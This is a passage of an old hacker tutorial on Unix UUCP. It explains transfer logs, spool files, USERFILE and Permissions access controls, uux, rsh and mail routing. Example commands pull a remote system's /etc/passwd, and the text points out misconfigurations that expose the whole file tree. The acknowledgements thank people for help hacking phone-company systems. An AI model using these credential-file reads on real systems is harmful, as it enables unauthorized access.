+1. SUCCEEDED (call to [system name])\par
+\par
+The system was successfully contacted.\par
+\par
+2. DIAL FAILED (call to [system name])\par
+\par
+Uucp failed to contact the system. The phone number entry for the system in the \par
+Systems file may be wrong, or in the wrong format.\par
+\par
+3. OK (startup)\par
+\par
+Conversation with the remote system has been initiated.\par
+\par
+4. LOGIN FAILED\par
+\par
+Uucp was unable to log into the remote system. There may be an error in the \par
+login field in the entry for the remote system in the Systems file, or line \par
+noise may have caused the login to fail.\par
+\par
+5. WRONG SYSTEM NAME\par
+\par
+The system's entry in the Systems file has the wrong name for the system at the \par
+phone number specified in the entry.\par
+\par
+6. REMOTE DOES NOT KNOW ME\par
+\par
+The remote system does not recognize the name of the local system, and will not \par
+perform transactions with an unknown system (some will, some won't...see the \par
+section on uucp security).\par
+\par
+7. REQUEST ([remote file] --> [local file] username)\par
+\par
+The file transfer has been requested.\par
+\par
+8. OK (conversation complete)\par
+\par
+The transfer has been completed.\par
+\par
+9. ACCESS DENIED\par
+\par
+Security measures prevented the file transfers.\par
+If you get this error, you will receive mail on the local system informing you \par
+that the transfer was denied by the remote.\par
+\par
+10. DEVICE LOCKED\par
+\par
+All the dialout devices were currently in use.\par
+\par
+\par
+\par
+A successful transaction log will usually look like this:\par
+\par
+root ripco (11/20-2:00-1234) SUCCEEDED (call to ripco)\par
+root ripco (11/20-2:01-1234) OK (startup)\par
+root ripco (11/20-2:01-1234) REQUEST (ripco!/etc/passwd --> /ripcofile root)\par
+root ripco (11/20-2:03 1234) OK (conversation complete)\par
+\par
+        When an error occurs during a transfer with a system, a status file is \par
+created for that system, and remains for a set period of time, usually about an \par
+hour. During this time, that system cannot be contacted. These files, depending \par
+on which version of Unix you are on, will either be in the directory \par
+/usr/spool/uucp, and have the form:\par
+STST..[system name]\par
+or will be in the directory /usr/spool/uucp/.Status, and have the same name as \par
+the system. These status files will contain the reason that the last transfer \par
+attempt with the system failed. These files are periodically purged, and if you \par
+wish to contact the system before its status file is purged, you must delete \par
+its status file.\par
+The files containing the failed transfer request will also remain. If you are\par
+using the latest version of System V, these files will be in a subdirectory of\par
+the directory /usr/spool/uucp. For instance, if the system is called ripco, \par
+the files will be in the directory /usr/spool/uucp/ripco. On other systems, \par
+these files will be in the directory /usr/spool/uucp/C., or /usr/spool/uucp. \par
+These files are in the form:\par
+\par
+C.[system name]AAAAAAA\par
+\par
+Where [system name] is the name of the system to be contacted, and AAAAAA is a \par
+the transfer's uucp job number. (You can see the transfer request's job number \par
+by specifying the j option when you initiate the transfer. For example, \par
+"uucp -j ripco!/etc/passwd /usr/spool/uucppublic/ripcofile" would initiate the\par
+transfer of the ripco system's password file, and display the job number on \par
+your screen.) Type "cat C.system[jobnumber]", and you will see something like \par
+this:\par
+\par
+R /etc/passwd /usr/pub/.dopeypasswd root -dc dummy 777 guest\par
+\par
+On earlier versions of Unix, these files will be in the directory \par
+/usr/spool/uucp/C. To find the file containing your transfer, display the \par
+contents of the files until you find the proper one. If your transfer fails, \par
+delete the transfer request file and the status file, correct any errors in the \par
+Systems file or whatever, and try again!\par
+\par
+UUCP SECURITY\par
+-------------\par
+        Obviously, uucp access to files has to be restricted. Otherwise, \par
+anyone, from any system, could copy any file from the remote system. This \par
+section will cover the security features of the uucp facilities.\par
+        The file /usr/lib/uucp/USERFILE contains a list of the directories that \par
+remote systems can copy from, and local users can send files from to remote \par
+systems. The entries in this file are in the format:\par
+\par
+[local user],[system] [callback?] [directories]\par
+\par
+Where:\par
+\par
+local user      -Is the username of a local account. This is for the purpose\par
+                of restricting which directories a local user can send files\par
+                from to a remote system. \par
+system          -Is the name of a remote system. This is for the purpose of \par
+                restricting which directories a specific remote system can\par
+                copy files from.\par
+callback?       -If there is a c in this field, then if a transfer request is\par
+                received from the system indicated in the system field, then\par
+                the local system (in this case, the local system is the system\par
+                which receives the transfer request, rather than the system\par
+                that initiated it) will hang up and call the remote back (at\par
+                the number indicated in the remote's entry in the local's\par
+                Systems file) before starting the transfer.\par
+directories     -Is a list of the pathnames of the directories that the remote\par
+                system indicated in the system field can copy files from, or\par
+                the local user indicated in the local user field can send files\par
+                from to a remote system.\par
+\par
+A typical entry might look like:\par
+\par
+local_dork,ripco - /usr/spool/uucppublic\par
+\par
+This means that the user local_dork can only send files to a remote system \par
+which are in the directory /usr/spool/uucppublic, and the remote system ripco \par
+can only copy files from the local system that are in the directory \par
+/usr/spool/uucppublic. This is typical: often, remotes are only allowed to copy \par
+files in that directory, and if they wish to copy a file from another portion \par
+of the system, they must notify a user on the system to move that file to the \par
+uucppublic directory. When a transfer request is received from a remote system, \par
+the local system scans through the userfile, ignoring the local user field (you \par
+can't restrict transfers with a particular user from a remote system...the copy \par
+access granted to a system in the USERFILE is granted to all users from that \par
+system), until it finds the entry for that system, and if the system is allowed \par
+to copy to or from that directory, the transfer is allowed, otherwise it is \par
+refused. If an entry for that system is not found, the USERFILE is scanned \par
+until an entry with a null system name (in other words, an entry with no system \par
+name specified) is found, and the directory permissions for that entry are \par
+used. If no entry is found with a null system name, the transfer is denied.\par
+There are a few quirks about USERFILE entries. First, if you have copy access \par
+to a directory, you also have copy access to any directories below it in the \par
+system tree. Thus, lazy system operators, rather than carefully limiting a \par
+system's access to only the directories it needs access to, often just give \par
+them copy access to the root directory, thus giving them copy access to the \par
+entire system tree. Yet another mistake made by careless superusers is leaving \par
+the system name field empty in the entries for the local users. Thus, if a \par
+system that doesn't have an entry in the USERFILE requests a transfer with the \par
+local system, when the USERFILE is scanned for an entry with a null system \par
+name, if the entries for the local users come first in the USERFILE, the system \par
+will use the first entry for a local user it finds, since it has a null system \par
+name in the system name field. Note, that none of these security features even \par
+works if the uucp account on the system the transfer is requested with does not \par
+use the uucico shell. In any case, whether the account uses the uucico shell or \par
+not, even if you have copy access to a directory, individual file or directory \par
+protections may prevent the copying. For information on uucp security in yet \par
+another version of the uucp facilities, see the piece on the Permissions file \par
+in the section on uux security.\par
+\par
+EXECUTING COMMANDS ON A REMOTE SYSTEM\par
+-------------------------------------\par
+        There are 2 commands for executing commands on a remote system- uux and \par
+rsh (remote shell- this has nothing to do with the rsh shell [restricted Bourne \par
+shell]). This section will cover the uses of both.\par
+\par
+UUX\par
+---\par
+        The uux command is one of the uucp utilities. This is used, not for \par
+file transfers, but for executing non-interactive commands on a remote system. \par
+By non-interactive, I mean commands that don't request input from the user, but \par
+are executed immediately when issued, such as rm and cp. The format is:\par
+\par
+uux remote!command line\par
+\par
+Where remote is the name of the remote system to perform the command on, and \par
+the rest (command line) is the command to be performed, and any arguments to \par
+the command. You will not receive any of the commnand's output, so this command \par
+can't be used for, say, printing the contents of a text file to your screen.\par
+\par
+UUX SECURITY\par
+------------\par
+        If the uucp account on the remote system uses the uucico shell, then \par
+these security features apply to it.\par
+\par
+        The file /usr/lib/uucp/Commands file contains a list of the commands a \par
+remote system can execute on the system. By remote system, in this case, I mean \par
+the system that the user who initiates the uux command is on, and local system \par
+will mean the system that receives the uux request. Entries in the file \par
+/usr/lib/uucp/Commands are in the following format:\par
+\par
+PATH=[pathname]\par
+command\par
+command\par
+  " to infinity...\par
+command,system\par
+\par
+The first line, PATH=[pathname], sets the searchpath for the remote system \par
+requesting the uux execution of a command on the local system. This entry is \par
+just the same as, say, a line in a login file that sets the searchpath for a \par
+regular account, example: PATH=/bin:/usr/bin\par
+Which sets the searchpath to search first the directory /bin, and the the \par
+directory /usr/bin when a command is issued. The following entries are the base \par
+names of the programs/commands that the remote can execute on the local system. \par
+The last program/command in this list is followed by a comma and the name of \par
+the remote site. For example:\par
+\par
+PATH=/bin\par
+rmail\par
+lp,ripco\par
+\par
+Means that the remote system Ripco can execute the rmail and lp commands on the \par
+local system. Usually, only the lp and rmail commands will be allowed.\par
+        Again, we come to another, "different" version of the uucp facilities. \par
+On some systems, the commands a remote system can execute on the local system \par
+are contained in the file /usr/lib/uucp/Permissions. Entries in this file are \par
+in the form:\par
+\par
+MACHINE=[remote] COMMANDS=[commands] REQUEST=[yes/no] SEND=[yes/no] READ=\par
+[directories] WRITE=[directories]\par
+\par
+Where:\par
+\par
+Remote is the name of the remote system. Commands is a list of the commands \par
+the remote may execute on the local system, in the form:\par
+pathname:pathname\par
+\par
+For example:\par
+\par
+/bin/rmail:/usr/bin/netnews\par
+\par
+The yes (or no) aft er "REQUEST=" tells whether or not the remote can copy \par
+files from the local system. The yes/no after "SEND=" tells whether or not the \par
+remote system can send files to the local system. The list of directories after \par
+"READ=" tells which directories the remote can copy files from (provided that \par
+it has REQUEST privileges), and is in the form:\par
+\par
+pathname:pathname...etc.\par
+\par
+For example:\par
+\par
+/usr/spool/uucppublic:/usr/lib/uucp\par
+\par
+Again, as before, the remote has copy access to any directories that are below \par
+the directories in the list in the system tree. The list of directories after \par
+"WRITE=" is in the same form as the list of directories after "READ=", and is a \par
+list of the directories that the remote can copy files TO on the local system.\par
+\par
+RSH\par
+---\par
+        This is a new feature which I have seen on a few systems. This is not, \par
+to the best of my knowledge, a System V feature, but a package available for \par
+3rd party software vendors. If the rsh command is featured on a system, the \par
+restricted (rsh) Bourne shell will be renamed rshell. Rsh stands for remote \par
+shell, and is for the execution of any command, interactive or otherwise, on a \par
+remote system. The command is executed realtime, and the output from the \par
+command will be sent to your display. Any keys you press while this command is \par
+being executed will be sent to the remote system, including breaks and \par
+interrupts. The format is:\par
+\par
+rsh [system] command line\par
+\par
+For example:\par
+\par
+rsh ripco cat /etc/passwd\par
+\par
+Will print out the /etc/passwd file of the Ripco system on your screen. To the \par
+best of my knowledge, the only security features of the rsh command are the \par
+individual file and directory protections of the remote system.\par
+\par
+UUNAME AND UUSTAT\par
+-----------------\par
+        These are 2 commands which are for use by users to show the state of \par
+the local system's uucp facilities. Uuname gives a list of all the system names \par
+in the Systems (L.sys) file, and uustat gives a list of all pending uucp/uux \par
+jobs.\par
+\par
+NETWORK MAIL\par
+------------\par
+        There are several different ways of sending mail to users on other \par
+systems. First of all, using the uucp and uux commands. Simply edit a text file \par
+containing the message you wish to send, and uucp a copy of it to the remote \par
+system. Then send it to the target user on that system using the uux command:\par
+\par
+uux system!rmail [username] < [pathname]\par
+\par
+Where system is the name of the system the target user is on, username is the \par
+name of the user you wish to send the mail to, and pathname is the pathname of \par
+the text file you sent to the remote system. This method works by executing the \par
+rmail command (Receive Mail), the syntax of which is "rmail [user]", and \par
+redirecting its input from the file you sent to the remote. This method will \par
+only work if the remote allows users from your local system to execut the rmail \par
+command.\par
+        The second method is for systems which feature the remote shell (rsh) \par
+command. If the remote system can be contacted by your local system via rsh, \par
+type:\par
+\par
+rsh system!mail [user]\par
+\par
+And once connected, enter your message as normal.\par
+        This last method is the method of sending mail over uucp networks. This \par
+method is the one employed by USENET and other large uucp networks, as well as \par
+many smaller and/or private networks. This method uses the simple mail command:\par
+\par
+mail system!system!system![and so on to infinity]!system@user\par
+\par
+Where:\par
+The list of systems is the routing to the target system, and user is the mail \par
+recipient on the target system. The routing takes a bit of explanation. Imagine \par
+something a uucp network with connections like this:\par
+\par
+                        unix1\par
+                          |\par
+                -------------------\par
+                |                 |\par
+              unix2             unix3\par
+                |                 |\par
+              unix4-------------unix5\par
+\par
+This network map shows what systems are on the network, and which systems have \par
+entries for which other systems in its Systems (L.sys) file. In this example:\par
+\par
+Unix1 has entries for unix2 and unix3.\par
+Unix2 has entries for unix1 and unix4.\par
+Unix3 has entries for unix1 and unix5.\par
+Unix4 has entries for unix2 and unix5.\par
+Unix5 has entries for unix3 and unix4.\par
+\par
+Now to explain the routing. If unix1 wanted to reach unix5, it couldn't do so \par
+directly, since it has no means of reaching it (no entry for it in its Systems \par
+file). So, it would "forward" the mail through a series of other systems. For \par
+example, to send mail to the user root on unix5, any of these routings could be \par
+used:\par
+\par
+unix3!unix5@root\par
+unix2!unix4!unix5@root\par
+\par
+Obviously, the first routing would be the shortest and quickest. So, to mail a \par
+message from unix1 to the root user on unix5, you would type:\par
+\par
+mail unix3!unix5@root\par
+\par
+Then type in your message and press control-D when finished, and the uucp \par
+facilities will deliver your mail.\par
+\par
+ACKNOWLEDGEMENTS\par
+----------------\par
+        Well, this is it- the end of the file. I hope you've found it \par
+informative and helpful. Before I go on, I'd like to thank a few people whose \par
+assistance made writing this file either A: possible or B: easier-\par
+\par
+Shadow Hawke I, for sharing many a Unix account with me.\par
+The Warrior (of 312), for helping me get started in hacking.\par
+Omega-- for helping me hack a large network of Unix systems.\par
+Psychedelic Warlord, for helping me with a BSD Unix system.\par
+Shooting Shark, for his C decoy, and more than a few good posts on Private \par
+Sector.\par
+Kid&Co, for providing me with some information on the Telnet program.\par
+And lastly but not leastly, Bellcore, Southern Bell, and BOC's around the \par
+country for the use of their systems. Thanks, all!\par
+\par
+\'1a-------------\par
+Corrections:\par
+I incorrectly listed i one section that chown was the command to change file protections.\par
+The correct command is chmod.\par
+}
+ 
